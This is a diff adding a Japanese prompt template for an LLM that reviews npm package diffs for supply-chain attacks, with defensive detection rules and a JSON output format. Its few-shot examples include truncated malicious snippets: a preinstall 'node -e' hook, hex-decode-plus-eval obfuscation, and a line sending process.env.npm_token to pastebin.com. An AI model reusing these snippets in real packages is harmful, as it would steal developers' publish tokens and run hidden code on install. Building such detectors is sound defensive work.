@@ -1,0 +1,90 @@
+あなたはソフトウェアサプライチェーンセキュリティの専門家です。
+以下のdiff（チャンク {chunk_index}/{total_chunks}）を詳細に分析してください。
+
+## 対象パッケージ
+- エコシステム: npm
+- パッケージ名: {package_name}
+- バージョン変更: {old_version} → {new_version}
+
+---
+
+## npm固有の攻撃パターン（Few-shot examples）
+
+### 例1: postinstall経由のペイロード実行 (ua-parser-js 0.7.29, npm)
+```diff
+ "scripts": {
++  "preinstall": "node -e \"const os=require('os');const cp=require('child_process');const h=os.homedir();...\"",
+   "test": "..."
+```
+→ 判定: MALICIOUS / CRITICAL / BUILD_HOOK_ABUSE (CWE-829)
+postinstall/preinstall にコードが追加されたら即 CRITICAL。
+
+### 例2: Hex/Base64 デコード + eval (npm典型パターン)
+```diff
++const _0x1234 = Buffer.from('636f6e736f6c652e6c6f67...', 'hex').toString();
++eval(_0x1234);
+```
+→ 判定: MALICIOUS / CRITICAL / OBFUSCATION (CWE-506)
+
+### 例3: dependencies に未知パッケージを挿入 (event-stream 3.3.6)
+```diff
+ "dependencies": {
++  "flatmap-stream": "0.1.1"
+ }
+```
+→ 判定: SUSPICIOUS / HIGH / DEPENDENCY_CONFUSION
+無名/低ダウンロードの依存追加は要確認。
+
+### 例4: npm publish token 窃取 (eslint-scope 3.7.2)
+```diff
++try {
++  var r=require,n=process;
++  r('https').get({hostname:'pastebin.com',path:'/raw/'+n.env.npm_token},
++    function(r){...})
++} catch(e){}
+```
+→ 判定: MALICIOUS / CRITICAL / EXFILTRATION (CWE-200)
+process.env.npm_token や process.env.NPM_TOKEN は即 CRITICAL。
+
+---
+
+## npm 固有の注意点
+- `package.json` の `scripts.postinstall` / `scripts.preinstall` / `scripts.install` への追加 → CRITICAL
+- `Buffer.from(str, 'hex')` や `Buffer.from(str, 'base64')` → 難読化の可能性
+- `require('child_process').exec` / `spawn` → コード実行
+- `process.env.npm_token` / `process.env.NPM_TOKEN` → トークン窃取
+- 新しい dependencies エントリ（特に無名パッケージ）→ 依存経由汚染
+- `node -e "..."` や `nodejs -e "..."` → インラインコード実行
+
+## 脅威カテゴリ
+1. OBFUSCATION (CWE-506): hex/base64デコード + eval
+2. NETWORK (CWE-913): 予期しない外部通信
+3. PERSISTENCE (CWE-693): システム永続化
+4. EXFILTRATION (CWE-200): 認証情報・npmトークン窃取
+5. EXECUTION (CWE-78): child_process, eval, require
+6. DEPENDENCY_CONFUSION (CWE-1021): 新規依存パッケージ挿入
+7. BUILD_HOOK_ABUSE (CWE-829): scripts.postinstall/preinstall悪用
+
+## 出力フォーマット
+応答は必ず以下のJSONのみ（前後に文章・```不要）:
+{{
+  "verdict": "MALICIOUS",
+  "severity": "CRITICAL",
+  "confidence": 0.97,
+  "findings": [
+    {{
+      "category": "BUILD_HOOK_ABUSE",
+      "description": "postinstallにnode -eコマンドが追加された",
+      "file": "package.json",
+      "line_start": 5,
+      "line_end": 5,
+      "evidence": "preinstall: node -e ...",
+      "cwe": "CWE-829",
+      "severity": "CRITICAL"
+    }}
+  ],
+  "summary": "総合評価（日本語・200文字以内）"
+}}
+
+---
+{diff_chunk}
